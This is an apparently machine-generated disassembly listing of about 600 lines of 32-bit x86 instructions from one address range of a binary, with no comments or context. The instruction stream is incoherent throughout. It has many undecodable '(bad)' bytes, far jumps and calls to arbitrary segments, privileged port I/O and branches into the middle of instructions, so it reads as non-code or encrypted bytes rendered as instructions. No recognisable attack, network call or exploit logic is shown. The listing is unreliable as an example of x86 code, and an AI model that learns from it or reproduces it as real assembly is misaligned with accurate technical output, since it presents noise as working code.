  409ef1:	rcr    BYTE PTR [edi-0xd],0x96
  409ef5:	cmc    
  409ef6:	jecxz  0x409f6e
  409ef8:	pop    ebx
  409ef9:	mov    ah,BYTE PTR [ecx]
  409efb:	cwde   
  409efc:	sub    eax,0xce09e698
  409f01:	jecxz  0x409f55
  409f03:	jle    0x409f6f
  409f05:	(bad)  
  409f06:	(bad)  
  409f08:	push   ss
  409f09:	mov    DWORD PTR [eax],esp
  409f0b:	in     eax,0xa2
  409f0d:	sbb    BYTE PTR [ecx],bh
  409f0f:	pop    es
  409f10:	jnp    0x409f06
  409f12:	enter  0x5652,0x73
  409f16:	mov    ecx,0x17228b18
  409f1b:	jp     0x409f46
  409f1d:	mov    eax,0xe2c9bd38
  409f22:	test   eax,0xa5b6e313
  409f27:	mov    edx,0x7a3eb22
  409f2c:	adc    DWORD PTR [esi],0xf
  409f2f:	adc    edi,DWORD PTR [edi]
  409f31:	mov    bl,0x9c
  409f33:	dec    ebx
  409f34:	(bad)  
  409f35:	gs (bad) 
  409f37:	out    dx,al
  409f38:	or     al,0xc2
  409f3a:	xor    edx,DWORD PTR [eax]
  409f3c:	out    0x4f,al
  409f3e:	(bad)
  409f42:	out    0xf1,eax
  409f44:	pop    ss
  409f45:	jmp    0x34c6:0xe318881e
  409f4c:	les    eax,FWORD PTR [esi+0x5db94916]
  409f52:	or     al,BYTE PTR [edi+0x2d]
  409f55:	jecxz  0x409f2f
  409f57:	mov    ds:0xef5de74b,eax
  409f5c:	jmp    0x1f654c15
  409f61:	jl     0x409fb5
  409f63:	fdiv   QWORD PTR [edi+eax*2]
  409f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f67:	sub    DWORD PTR [esp+eiz*8],esp
  409f6a:	dec    ebp
  409f6b:	jnp    0x409fec
  409f6d:	fwait
  409f6e:	xchg   esp,eax
  409f6f:	jmp    0xec27:0x1124b52b
  409f76:	mov    edi,0xecbefe72
  409f7b:	stos   BYTE PTR es:[edi],al
  409f7c:	mov    bh,0xad
  409f7e:	sbb    DWORD PTR [edi+0x26275ad5],edi
  409f84:	mov    ch,0x20
  409f86:	sbb    edx,edi
  409f88:	lahf   
  409f89:	fwait
  409f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f8b:	pop    edi
  409f8c:	fmul   QWORD PTR [ebp-0x1d]
  409f8f:	xchg   ebx,eax
  409f90:	xor    ecx,esp
  409f92:	mov    WORD PTR [eax+eax*8+0x25],cs
  409f96:	retf   0xad81
  409f99:	xlat   BYTE PTR ds:[ebx]
  409f9a:	mov    edi,0x6c92c96a
  409f9f:	stos   DWORD PTR es:[edi],eax
  409fa0:	xor    al,0x67
  409fa2:	adc    eax,edx
  409fa4:	call   0xee91:0x3a5126f6
  409fab:	popa   
  409fac:	sahf   
  409fad:	push   ss
  409fae:	sahf   
  409faf:	fwait
  409fb0:	jmp    0x5211:0x25f3ab5f
  409fb7:	push   ss
  409fb8:	push   cs
  409fb9:	cwde   
  409fba:	sbb    al,dl
  409fbc:	xlat   BYTE PTR ds:[ebx]
  409fbd:	scas   al,BYTE PTR es:[edi]
  409fbe:	adc    eax,0xf45ea4e1
  409fc3:	sub    edx,edi
  409fc5:	push   ds
  409fc6:	out    0x8a,eax
  409fc8:	mov    ds:0x3e5e746e,al
  409fcd:	aam    0xce
  409fcf:	mov    ebp,0x69f0360e
  409fd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fd5:	js     0x409fff
  409fd7:	add    DWORD PTR [edi+0x65b6f70a],0x44
  409fde:	push   edi
  409fdf:	jge    0x409ff9
  409fe1:	test   al,0xa1
  409fe3:	je     0x409f93
  409fe5:	sbb    ch,ah
  409fe7:	outs   dx,BYTE PTR ds:[esi]
  409fe8:	nop
  409fe9:	xchg   ebx,eax
  409fea:	pushf  
  409feb:	push   ebx
  409fec:	js     0x409fe2
  409fee:	rol    BYTE PTR [edx-0x61],0x16
  409ff2:	xor    eax,0xd2f0a5fe
  409ff7:	push   esp
  409ff8:	push   0xe57db08f
  409ffd:	sbb    esp,DWORD PTR [ebp-0x53]
  40a000:	xchg   ebp,eax
  40a001:	daa    
  40a002:	in     al,0x62
  40a004:	out    dx,al
  40a005:	call   0x59e9:0x65979924
  40a00c:	jecxz  0x409fe1
  40a00e:	push   eax
  40a00f:	outs   dx,BYTE PTR ds:[esi]
  40a010:	fdivr  QWORD PTR [eax]
  40a012:	mov    bl,0x8b
  40a014:	lea    ecx,[edx]
  40a016:	jp     0x40a080
  40a018:	loop   0x40a06a
  40a01a:	in     eax,dx
  40a01b:	ds inc esp
  40a01d:	sahf   
  40a01e:	add    DWORD PTR [ebx],eax
  40a020:	fisttp WORD PTR [edi+0x17]
  40a023:	pushf  
  40a024:	adc    BYTE PTR [edi-0x63534baa],ah
  40a02a:	ror    BYTE PTR ds:0x979c2f60,0xb3
  40a031:	stc    
  40a032:	push   ecx
  40a033:	push   cs
  40a034:	adc    esi,0x31
  40a037:	out    0xb0,al
  40a039:	or     eax,0xf1f27215
  40a03e:	adc    eax,0x52523236
  40a043:	push   es
  40a044:	in     eax,0x29
  40a046:	pop    ecx
  40a047:	(bad)  
  40a048:	div    DWORD PTR [eax]
  40a04a:	hlt    
  40a04b:	dec    esp
  40a04c:	pop    edx
  40a04d:	stos   BYTE PTR es:[edi],al
  40a04e:	xor    al,0xb1
  40a050:	jo     0x40a038
  40a052:	sbb    eax,0xd63fb830
  40a057:	mov    bl,BYTE PTR [ecx]
  40a059:	data16 sub BYTE PTR [ecx+0x78],dh
  40a05d:	push   ebx
  40a05e:	in     al,0xde
  40a060:	adc    ebp,DWORD PTR [edi+0x5b]
  40a063:	push   ecx
  40a064:	test   dh,bh
  40a066:	ud1    ebx,DWORD PTR [ebp-0x43c02b9]
  40a06d:	and    eax,0x2e1c647a
  40a072:	(bad)  
  40a073:	push   esp
  40a074:	into   
  40a075:	bswap  ecx
  40a077:	sub    bh,ah
  40a079:	lods   eax,DWORD PTR ds:[esi]
  40a07a:	and    al,0xb0
  40a07c:	clc    
  40a07d:	lahf   
  40a07e:	adc    BYTE PTR ds:0xe5ab5f98,dl
  40a084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a085:	mov    bh,BYTE PTR [ebp+0x66f719cf]
  40a08b:	adc    bl,BYTE PTR [edx-0x7c]
  40a08e:	dec    eax
  40a08f:	inc    esi
  40a090:	adc    eax,0x530f1eaf
  40a095:	lods   al,BYTE PTR ds:[esi]
  40a096:	call   0x7c17:0x8bc19e69
  40a09d:	mov    ds:0x1634521f,eax
  40a0a2:	fwait
  40a0a3:	bound  ebx,QWORD PTR [ebx-0x5a]
  40a0a6:	cli    
  40a0a7:	and    edx,esi
  40a0a9:	fcmovbe st,st(0)
  40a0ab:	jae    0x40a03e
  40a0ad:	ins    DWORD PTR es:[edi],dx
  40a0ae:	(bad)  
  40a0af:	out    dx,eax
  40a0b0:	jecxz  0x40a062
  40a0b2:	imul   eax,DWORD PTR [edi],0xba8c1ff9
  40a0b8:	xlat   BYTE PTR ds:[ebx]
  40a0b9:	or     DWORD PTR [edx],edx
  40a0bb:	or     esp,esi
  40a0bd:	push   esp
  40a0be:	fisubr WORD PTR [esi]
  40a0c0:	leave  
  40a0c1:	shr    DWORD PTR [ebp+0x75],cl
  40a0c4:	(bad)  
  40a0c5:	push   eax
  40a0c6:	sbb    ecx,DWORD PTR [eax+0x8]
  40a0c9:	cmp    al,0x56
  40a0cb:	idiv   BYTE PTR [ecx+0x4418c9e8]
  40a0d1:	les    esp,FWORD PTR [ebx+0x1bc99767]
  40a0d7:	fsubr  DWORD PTR [edx-0x2a]
  40a0da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0db:	test   eax,0x248fa296
  40a0e0:	retf   0x6ad9
  40a0e3:	sbb    dh,BYTE PTR [esi]
  40a0e5:	(bad)  
  40a0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0e7:	push   0xffffffe2
  40a0e9:	je     0x40a110
  40a0eb:	sti    
  40a0ec:	xchg   esp,eax
  40a0ed:	enter  0x15ec,0xcd
  40a0f1:	in     al,dx
  40a0f2:	ins    BYTE PTR es:[edi],dx
  40a0f3:	add    cl,dh
  40a0f5:	aas    
  40a0f6:	in     eax,dx
  40a0f7:	cmp    eax,0x57f44d6
  40a0fc:	push   ss
  40a0fd:	test   BYTE PTR [esi],cl
  40a0ff:	je     0x40a10d
  40a101:	push   ecx
  40a102:	pushf  
  40a103:	(bad)  
  40a104:	jmp    0x40a12c
  40a106:	(bad)  
  40a107:	ds dec esi
  40a109:	push   ebp
  40a10a:	fnstenv [ebx]
  40a10c:	pop    ss
  40a10d:	sbb    al,0x7f
  40a10f:	(bad)  
  40a110:	or     al,0x12
  40a112:	jp     0x40a0c5
  40a114:	push   es
  40a115:	call   0x4b62fc6c
  40a11a:	ds xchg edi,eax
  40a11c:	pop    es
  40a11d:	cmp    bl,bl
  40a11f:	mov    bh,0xb0
  40a121:	rcr    DWORD PTR [esi-0x2b],cl
  40a124:	jo     0x40a170
  40a126:	stc    
  40a127:	test   eax,0x40f762e
  40a12c:	xor    ah,ch
  40a12e:	mul    BYTE PTR [bp+si+0x6e]
  40a132:	jbe    0x40a0de
  40a134:	mov    edx,0xfb2b14cf
  40a139:	or     dl,BYTE PTR [edi]
  40a13b:	xlat   BYTE PTR ds:[ebx]
  40a13c:	xchg   ecx,eax
  40a13d:	push   es
  40a13e:	std    
  40a13f:	aas    
  40a140:	shl    BYTE PTR [ecx+0x7],1
  40a143:	or     DWORD PTR [eax+ebp*4+0x4e],esi
  40a147:	jle    0x40a19c
  40a149:	fxch   st(6)
  40a14b:	icebp  
  40a14c:	lea    ecx,ds:0xe67d7837
  40a152:	out    dx,al
  40a153:	cmc    
  40a154:	loop   0x40a162
  40a156:	push   ebp
  40a157:	rcr    edx,0x4f
  40a15a:	fisubr WORD PTR [ecx+eiz*1-0x46b55baa]
  40a162:	inc    ebx
  40a163:	add    al,0x94
  40a165:	or     dh,al
  40a167:	mov    bl,0x13
  40a169:	inc    ecx
  40a16a:	pop    ecx
  40a16b:	inc    eax
  40a16c:	pop    ds
  40a16d:	jbe    0x40a137
  40a16f:	sbb    DWORD PTR [esi+eax*1-0x15],0x77
  40a174:	dec    esi
  40a175:	aas    
  40a176:	ds or  eax,0xe299d8b8
  40a17c:	test   DWORD PTR [ebx-0x4],0x206e9f8f
  40a183:	rcl    cl,0xe3
  40a186:	ret    
  40a187:	nop
  40a188:	mov    ds:0x8649fe58,al
  40a18d:	xor    BYTE PTR [esi+0x32b87b8b],0x5f
  40a194:	cmp    eax,0x5c9a1429
  40a199:	fcmovbe st,st(6)
  40a19b:	sub    ebx,DWORD PTR ds:0x6c61f51d
  40a1a1:	jge    0x40a14f
  40a1a3:	jge    0x40a1a5
  40a1a5:	mov    bh,0xb6
  40a1a7:	cmp    BYTE PTR [eax+0x404ec3d8],dh
  40a1ad:	sub    ch,cl
  40a1af:	in     al,dx
  40a1b0:	mov    ebx,0x30c92def
  40a1b5:	or     al,0xbe
  40a1b7:	mov    DWORD PTR [edx-0x52],esp
  40a1ba:	ret    
  40a1bb:	and    bh,BYTE PTR [esp+ebp*4+0xa80b70b]
  40a1c2:	rol    DWORD PTR [ecx+0x78e34390],cl
  40a1c8:	arpl   si,cx
  40a1ca:	(bad)  
  40a1cb:	jge    0x40a199
  40a1cd:	adc    edi,DWORD PTR [edi]
  40a1cf:	sti    
  40a1d0:	or     bh,BYTE PTR [ebx+edi*4+0x5f]
  40a1d4:	jb     0x40a1bd
  40a1d6:	jle    0x40a230
  40a1d8:	shr    esp,1
  40a1da:	sub    BYTE PTR [ebx+eax*1-0x14],0x64
  40a1df:	or     DWORD PTR [esp+ebp*8+0x16ad0931],ecx
  40a1e6:	xchg   ebx,eax
  40a1e7:	fstp   DWORD PTR [edi+0x2184b992]
  40a1ed:	scas   eax,DWORD PTR es:[edi]
  40a1ee:	adc    dl,BYTE PTR [ebx-0x6bf560f0]
  40a1f4:	pop    ds
  40a1f5:	mov    ebx,0x795a5e81
  40a1fa:	inc    ebx
  40a1fb:	out    dx,al
  40a1fc:	pop    esi
  40a1fd:	inc    esi
  40a1fe:	xor    DWORD PTR [esi-0x7c],esp
  40a201:	sub    al,0x4c
  40a203:	call   0x8d66d554
  40a208:	stc    
  40a209:	add    ebp,DWORD PTR [ecx+0x67688e94]
  40a20f:	(bad)  
  40a210:	gs pop ss
  40a212:	sub    al,0x7b
  40a214:	mov    ds:0xb0649064,al
  40a219:	lods   eax,DWORD PTR ds:[esi]
  40a21a:	jno    0x40a1f5
  40a21c:	mov    dh,0x51
  40a21e:	and    al,0x9d
  40a220:	jle    0x40a28e
  40a222:	and    ch,bl
  40a224:	inc    edi
  40a225:	pop    ebx
  40a226:	mov    BYTE PTR [ebp+0x62f71d20],0x3f
  40a22d:	je     0x40a259
  40a22f:	dec    eax
  40a230:	mov    edi,0x9411aad2
  40a235:	stos   BYTE PTR es:[edi],al
  40a236:	add    al,0x42
  40a238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a239:	or     BYTE PTR [edx],bh
  40a23b:	jle    0x40a1d8
  40a23d:	inc    esi
  40a23e:	sbb    DWORD PTR [ecx-0x9],esp
  40a241:	push   ebx
  40a242:	mov    edx,eax
  40a244:	int3   
  40a245:	or     al,0xdd
  40a247:	pop    edi
  40a248:	mov    eax,0xd1b7c7f4
  40a24d:	add    BYTE PTR ds:0xbb36aa9a,ah
  40a253:	fsub   DWORD PTR [ecx]
  40a255:	lock cs adc eax,0xd8205967
  40a25c:	gs cmp esi,ebx
  40a25f:	jge    0x40a256
  40a261:	out    0x9b,eax
  40a263:	push   esp
  40a264:	sub    DWORD PTR ds:0xd147,ecx
  40a269:	mov    eax,ds:0x6f4eb14b
  40a26e:	pop    ss
  40a26f:	pop    edi
  40a270:	jecxz  0x40a299
  40a272:	fbstp  TBYTE PTR [esi-0x66]
  40a275:	mov    ah,0x11
  40a277:	push   esp
  40a278:	sbb    al,0x13
  40a27a:	pushf  
  40a27b:	mov    eax,ds:0x4dff5a82
  40a280:	jne    0x40a238
  40a282:	and    BYTE PTR [edx],dh
  40a284:	ret    
  40a285:	jae    0x40a274
  40a287:	jp     0x40a2b5
  40a289:	push   es
  40a28a:	sbb    bh,dl
  40a28c:	sub    DWORD PTR [edi],0x2d
  40a28f:	cmp    DWORD PTR [edx],0x9c6c8a2c
  40a295:	imul   eax
  40a297:	sub    DWORD PTR [edx+0x26c455b4],eax
  40a29d:	loop   0x40a2a8
  40a29f:	add    BYTE PTR [edx+0x12],al
  40a2a2:	imul   edi,DWORD PTR [ecx+0x9],0x950ea139
  40a2a9:	mov    bh,BYTE PTR [esi+0x62640bfb]
  40a2af:	or     bl,BYTE PTR [ecx+esi*1-0x58]
  40a2b3:	es mov cs:0x2fc60ec,eax
  40a2ba:	cmp    eax,0x540ba960
  40a2bf:	daa    
  40a2c0:	xor    eax,0x81dbb463
  40a2c5:	dec    ebx
  40a2c6:	xor    dl,BYTE PTR [eax]
  40a2c8:	fs retf 0x7b0a
  40a2cc:	outs   dx,DWORD PTR ds:[esi]
  40a2cd:	dec    eax
  40a2ce:	data16 cld 
  40a2d0:	in     al,0xda
  40a2d2:	or     DWORD PTR [eax+0x4f362211],edi
  40a2d8:	shl    ecx,cl
  40a2da:	xor    eax,0x70192c61
  40a2df:	nop
  40a2e0:	sar    BYTE PTR [edx+edi*2],0x1b
  40a2e4:	adc    BYTE PTR [ebx-0x18],dh
  40a2e7:	int3   
  40a2e8:	xlat   BYTE PTR ds:[ebx]
  40a2e9:	test   BYTE PTR [edi],ch
  40a2eb:	gs jnp 0x40a2f0
  40a2ee:	cmp    ah,al
  40a2f0:	fstcw  WORD PTR [edi]
  40a2f3:	mov    bl,0x83
  40a2f5:	push   ebp
  40a2f6:	push   es
  40a2f7:	dec    ecx
  40a2f8:	dec    ebx
  40a2f9:	inc    esp
  40a2fa:	pop    edx
  40a2fb:	add    DWORD PTR [edx+ecx*1],edi
  40a2fe:	adc    dh,BYTE PTR [eax]
  40a300:	mov    WORD PTR [ebx-0xd998e6a],ss
  40a306:	ins    BYTE PTR es:[edi],dx
  40a307:	test   BYTE PTR ds:0xf7265fd7,ah
  40a30d:	rcl    BYTE PTR [edi-0x274b9ae3],1
  40a313:	test   eax,0x9d14875f
  40a318:	xor    DWORD PTR [edi-0x3c45a795],esp
  40a31e:	sbb    BYTE PTR [esi-0x5b],bl
  40a321:	repnz bound edx,QWORD PTR [ebx]
  40a324:	xor    cl,al
  40a326:	ds adc ch,dh
  40a329:	jne    0x40a33f
  40a32b:	fs mov dh,0xe8
  40a32e:	fsub   QWORD PTR [esi-0x14]
  40a331:	ins    BYTE PTR es:[edi],dx
  40a332:	fstp   QWORD PTR [edi]
  40a334:	popa   
  40a335:	adc    al,0x9
  40a337:	in     eax,0x4e
  40a339:	push   esi
  40a33a:	(bad)  
  40a33b:	fadd   DWORD PTR [ecx-0x417577f8]
  40a342:	push   ds
  40a343:	xchg   edx,eax
  40a344:	xor    bl,BYTE PTR [ebx-0x19d893b1]
  40a34a:	mov    ah,0x63
  40a34c:	ret    0xcd0a
  40a34f:	mov    edi,0x42a1ac4a
  40a354:	push   edx
  40a355:	inc    edx
  40a356:	aaa    
  40a357:	pusha  
  40a358:	inc    edx
  40a359:	pop    eax
  40a35a:	inc    esp
  40a35b:	and    DWORD PTR [edx],ebx
  40a35d:	(bad)  
  40a35e:	ins    DWORD PTR es:[edi],dx
  40a35f:	xor    bl,BYTE PTR [esi+0x72]
  40a362:	push   0x26
  40a364:	repz xor al,0xcc
  40a367:	daa    
  40a368:	js     0x40a2fa
  40a36a:	or     al,0x42
  40a36c:	xor    BYTE PTR [edi+ebp*8-0x2d],0x6b
  40a371:	jg     0x40a3a3
  40a373:	sbb    dl,bl
  40a375:	es test dh,ah
  40a378:	and    BYTE PTR [ebx],al
  40a37a:	in     al,dx
  40a37b:	dec    edi
  40a37c:	loope  0x40a33c
  40a37e:	(bad)  
  40a37f:	and    DWORD PTR [edx+0x1405531],ebp
  40a385:	add    eax,0x900383e8
  40a38a:	jge    0x40a360
  40a38c:	out    0x45,al
  40a38e:	push   edi
  40a38f:	fs inc edi
  40a391:	xchg   al,dl
  40a393:	mov    ch,0x1c
  40a395:	enter  0x3bdf,0x17
  40a399:	xor    DWORD PTR [ebp-0x635a1e36],esi
  40a39f:	fld    DWORD PTR ds:0xccd0198
  40a3a5:	std    
  40a3a6:	mov    al,ds:0xa45b7a24
  40a3ab:	cmp    BYTE PTR [esi+ebx*8],al
  40a3ae:	das    
  40a3af:	sahf   
  40a3b0:	mov    ds:0x154eb2c1,al
  40a3b5:	out    0x1,eax
  40a3b7:	out    dx,eax
  40a3b8:	add    al,0x18
  40a3ba:	xchg   esp,eax
  40a3bb:	mov    ecx,0x26716c73
  40a3c0:	mov    cl,0x7b
  40a3c2:	cmp    al,0x86
  40a3c4:	adc    eax,0x2192a403
  40a3c9:	test   BYTE PTR [ebx],bl
  40a3cb:	sbb    eax,0xe2b21634
  40a3d0:	jge    0x40a363
  40a3d2:	dec    esp
  40a3d3:	mov    esi,0xe58258df
  40a3d8:	inc    ebp
  40a3d9:	mov    ah,0xf2
  40a3db:	ins    DWORD PTR es:[edi],dx
  40a3dc:	xor    DWORD PTR [ebx],ecx
  40a3de:	inc    ebx
  40a3df:	jo     0x40a440
  40a3e1:	inc    edx
  40a3e2:	repz pop es
  40a3e4:	inc    ebp
  40a3e5:	and    DWORD PTR [ecx+0x4ca1d007],edi
  40a3eb:	call   0x70f3:0x5ddfea1b
  40a3f2:	stc    
  40a3f3:	das    
  40a3f4:	dec    esi
  40a3f5:	inc    ecx
  40a3f7:	push   cs
  40a3f8:	nop
  40a3f9:	mov    cl,0xc7
  40a3fb:	in     al,0x28
  40a3fd:	lahf   
  40a3fe:	mov    edi,0xda2ebd28
  40a403:	in     al,0xd8
  40a405:	in     eax,0xba
  40a407:	pop    ss
  40a408:	mov    edi,0xf0724170
  40a40d:	xchg   ebp,eax
  40a40e:	int    0x58
  40a410:	add    edx,eax
  40a412:	fadd   DWORD PTR [eax+edx*1]
  40a415:	(bad)  
  40a416:	aad    0xb5
  40a418:	xchg   edx,eax
  40a419:	int3   
  40a41a:	dec    edi
  40a41b:	and    eax,0x897480b4
  40a420:	push   ebp
  40a421:	in     al,0xd8
  40a423:	in     al,dx
  40a424:	mov    ebx,0x7f45d0d6
  40a429:	not    BYTE PTR [ebp-0x5b]
  40a42c:	out    0x52,eax
  40a42e:	loopne 0x40a41e
  40a430:	shr    DWORD PTR [edx],cl
  40a432:	xor    al,0x2c
  40a434:	out    0xba,al
  40a436:	mov    WORD PTR [esi],gs
  40a438:	std    
  40a439:	cs das 
  40a43b:	push   esi
  40a43c:	mov    ecx,0xb105895f
  40a441:	mov    ds:0x2333d354,al
  40a446:	cli    
  40a447:	and    ebp,esp
  40a449:	ret    0x1a70
  40a44c:	pop    ss
  40a44d:	repz inc ecx
  40a44f:	shl    BYTE PTR [edx],cl
  40a451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a452:	ret    0xf6a0
  40a455:	mov    eax,0x40575b45
  40a45a:	bound  ecx,QWORD PTR [eax+0x4d]
  40a45d:	push   ds
  40a45e:	shl    eax,1
  40a460:	sbb    BYTE PTR [edx+0x1a],bh
  40a463:	jmp    0x40a4e0
  40a465:	lahf   
  40a466:	jbe    0x40a444
  40a468:	mov    eax,0xa6f3e15c
  40a46d:	jg     0x40a48a
  40a46f:	push   0xffffffe0
  40a471:	jo     0x40a410
  40a473:	fwait
  40a474:	sub    eax,0xa7f6cdf6
  40a479:	sti    
  40a47a:	loope  0x40a4a2
  40a47c:	jb     0x40a4aa
  40a47e:	sahf   
  40a47f:	and    al,0x51
  40a481:	inc    ecx
  40a482:	cmp    BYTE PTR [esi+edx*1-0x37],0xf5
  40a487:	inc    ecx
  40a488:	inc    ebx
  40a489:	jb     0x40a47c
  40a48b:	cmp    al,0xd6
  40a48d:	cld    
  40a48e:	mov    al,0x9a
  40a490:	outs   dx,DWORD PTR ds:[esi]
  40a491:	xchg   BYTE PTR [eax+0x30da3bb2],dl
  40a497:	in     eax,0xd1
  40a499:	dec    edi
  40a49a:	pusha  
  40a49b:	daa    
  40a49c:	or     BYTE PTR [edi+0xe],bh
  40a49f:	stos   BYTE PTR es:[edi],al
  40a4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4a1:	xchg   DWORD PTR [esp+ebx*2-0x3f9bee9b],eax
  40a4a8:	mov    ds:0x2448971,eax
  40a4ad:	add    al,0xe4
  40a4af:	pushf  
  40a4b0:	cmp    BYTE PTR [eax-0x7d],ch
  40a4b3:	lods   al,BYTE PTR ds:[esi]
  40a4b4:	das    
  40a4b5:	test   al,0x22
  40a4b7:	pop    edi
  40a4b8:	sbb    ebp,ebx
  40a4ba:	daa    
  40a4bb:	inc    ebp
  40a4bc:	ret    
  40a4bd:	fist   DWORD PTR [edx]
  40a4bf:	enter  0x723b,0x6e
  40a4c3:	xchg   esp,eax
  40a4c4:	out    dx,al
  40a4c5:	cmp    eax,0x9aa8f2b9
  40a4ca:	xor    ebp,0xd2e22b73
  40a4d0:	jne    0x40a472
  40a4d2:	lahf   
  40a4d3:	(bad)  
  40a4d4:	in     eax,dx
  40a4d5:	mov    bl,0x44
  40a4d7:	enter  0x187a,0xbe
  40a4db:	push   edx
  40a4dc:	mov    bh,0x11
  40a4de:	mov    ds:0x5517adbe,eax
  40a4e3:	call   0x1eba60be
  40a4e8:	mov    eax,0x6c65ef2e
  40a4ed:	jle    0x40a531
  40a4ef:	iret   
  40a4f0:	fs mul dh
  40a4f3:	popf   
  40a4f4:	inc    esp
  40a4f5:	stos   BYTE PTR es:[edi],al
  40a4f6:	push   0x258b127a
  40a4fb:	sub    al,0x50
  40a4fd:	test   eax,0x637f655e
  40a502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a503:	xchg   bl,dl
  40a505:	inc    ebp
  40a506:	js     0x40a540
  40a508:	dec    eax
  40a509:	addr16 mov edi,0xb7d0253c
  40a50f:	jmp    0x40a58f
  40a511:	sub    edi,ebp
  40a513:	fcom   DWORD PTR [edi-0x39ccc49e]
  40a519:	les    edx,FWORD PTR [ebp+0x4d]
  40a51c:	ret    0xe0be
  40a51f:	imul   esi,esp,0x2b729507
  40a525:	aaa    
  40a526:	adc    eax,0x5a4efbe2
  40a52b:	push   ecx
  40a52c:	inc    ebx
  40a52d:	outs   dx,BYTE PTR ds:[esi]
  40a52e:	lds    edi,FWORD PTR ds:0x23d5695d
  40a534:	lahf   
  40a535:	dec    edi
  40a536:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a537:	xchg   esi,eax
  40a538:	sub    bh,BYTE PTR [ecx-0x3b]
  40a53b:	xor    al,0x8b
  40a53d:	inc    edx
  40a53e:	xchg   edi,eax
  40a53f:	mov    ah,0x19
  40a541:	in     eax,0x73
  40a543:	mov    dh,0x75
  40a545:	int    0x80
  40a547:	jns    0x40a50e
  40a549:	leave  
  40a54a:	arpl   WORD PTR ds:0x8f2ded5d,cx
  40a550:	jmp    0x6760:0xf6e2df8c
  40a557:	lds    ebx,FWORD PTR [edi]
  40a559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a55a:	arpl   sp,bx
  40a55c:	or     eax,0x953fcb0c
  40a561:	dec    esp
  40a563:	push   edx
  40a564:	mov    ecx,0xf1b0035c
  40a569:	stos   DWORD PTR es:[edi],eax
  40a56a:	push   0x4addc97f
  40a56f:	popf   
  40a570:	adc    BYTE PTR [eax-0x1],dl
  40a573:	xchg   edx,eax
  40a574:	stc    
  40a575:	jmp    0x4c41fa63
  40a57a:	jns    0x40a534
  40a57c:	loopne 0x40a52d
  40a57e:	sar    BYTE PTR [ebx+edi*1],cl
  40a581:	lock add DWORD PTR [edi-0x57],esi
  40a585:	push   eax
  40a586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a587:	pop    esp
  40a588:	rcr    DWORD PTR [edi+0x12],1
  40a58b:	out    0xdc,eax
  40a58d:	and    esp,esp
  40a58f:	int3   
  40a590:	adc    eax,0xeea952fe
  40a595:	jbe    0x40a526
  40a597:	cwde   
  40a598:	sub    edi,ebp
  40a59a:	push   ecx
  40a59b:	lds    eax,FWORD PTR [ebx+0x28]
  40a59e:	and    BYTE PTR [edi-0x195446ed],0xcf
  40a5a5:	les    ebp,FWORD PTR [edi-0x48]
  40a5a8:	lods   eax,DWORD PTR ds:[esi]
  40a5a9:	jnp    0x40a5ad
  40a5ab:	fld    QWORD PTR [ebp-0x766ba5cc]
  40a5b1:	jge    0x40a53c
  40a5b3:	add    edx,ecx
  40a5b5:	neg    ah
  40a5b7:	js     0x40a542
  40a5b9:	call   0x3afc26e4
  40a5be:	hlt    
  40a5bf:	sbb    bh,BYTE PTR [edx]
  40a5c1:	mov    eax,ds:0x9d2cba06
  40a5c6:	cmc    
  40a5c7:	popa   
  40a5c8:	push   ecx
  40a5c9:	fisttp DWORD PTR [ecx+eax*1]
  40a5cc:	fldenv [ecx+ebx*2]
  40a5cf:	mov    dh,0x2e
  40a5d1:	in     al,dx
  40a5d2:	push   ebx
  40a5d3:	adc    BYTE PTR [edx+edx*2+0x7e],al
  40a5d7:	outs   dx,DWORD PTR ds:[esi]
  40a5d8:	adc    ecx,DWORD PTR [edx+0x5c9ff318]
  40a5de:	call   0xa4b8:0xb7f6dd05
  40a5e5:	cmp    dh,BYTE PTR [edi-0x2]
  40a5e8:	in     al,dx
  40a5e9:	add    ch,BYTE PTR [ecx+edx*2+0x1a]
  40a5ed:	cdq    
  40a5ee:	scas   eax,DWORD PTR es:[edi]
  40a5ef:	call   0x75e7c5cd
  40a5f4:	sbb    cl,BYTE PTR [eax]
  40a5f6:	ror    BYTE PTR [esi+eiz*8],0xd3
  40a5fa:	mov    edx,0x67e1e3f7
  40a5ff:	push   ss
  40a600:	aam    0x5f
  40a602:	inc    esi
  40a603:	push   edx
  40a604:	call   0xd888:0x93ba526d
  40a60b:	inc    esi
  40a60c:	sbb    ch,dl
  40a60e:	out    0xaf,eax
  40a610:	mov    eax,0xa25251a8
  40a615:	fidivr DWORD PTR [edx+0x5f769172]
  40a61b:	cmp    eax,0x6a6116ad
  40a620:	rcpps  xmm2,XMMWORD PTR [esi-0xc05fefd]
  40a627:	pop    es
  40a628:	ss mov dh,0x32
  40a62b:	leave  
  40a62c:	push   0xffffffcc
  40a62e:	std    
  40a62f:	cld    
  40a630:	popf   
  40a631:	jp     0x40a5dc
  40a633:	sbb    dl,BYTE PTR [edx+0x3a]
  40a636:	jge    0x40a63c
  40a638:	jns    0x40a68f
  40a63a:	add    dl,BYTE PTR [ebp-0x5487f3c]
  40a640:	mov    eax,es:0xb1c16a7
  40a646:	sbb    ebx,DWORD PTR [ebx]
  40a648:	jb     0x40a5da
  40a64a:	cmp    esi,DWORD PTR cs:[ebp-0x10]
  40a64e:	mov    dh,0xa3
  40a650:	ss ret 
  40a652:	repnz xlat BYTE PTR ds:[ebx]
  40a654:	mov    ds:0x447e7d59,eax
  40a659:	add    dh,bl
  40a65b:	shr    bl,cl
  40a65d:	mov    edx,gs
  40a65f:	sbb    ecx,esi
  40a661:	es hlt 
  40a663:	push   0x78357205
  40a668:	ja     0x40a664
  40a66a:	aaa    
  40a66b:	mov    bh,0xc
  40a66d:	cmp    dh,BYTE PTR [edi+0x6f]
  40a670:	pop    es
  40a671:	mov    edx,0x6528644e
  40a676:	jbe    0x40a68e
  40a678:	push   es
  40a679:	push   ecx
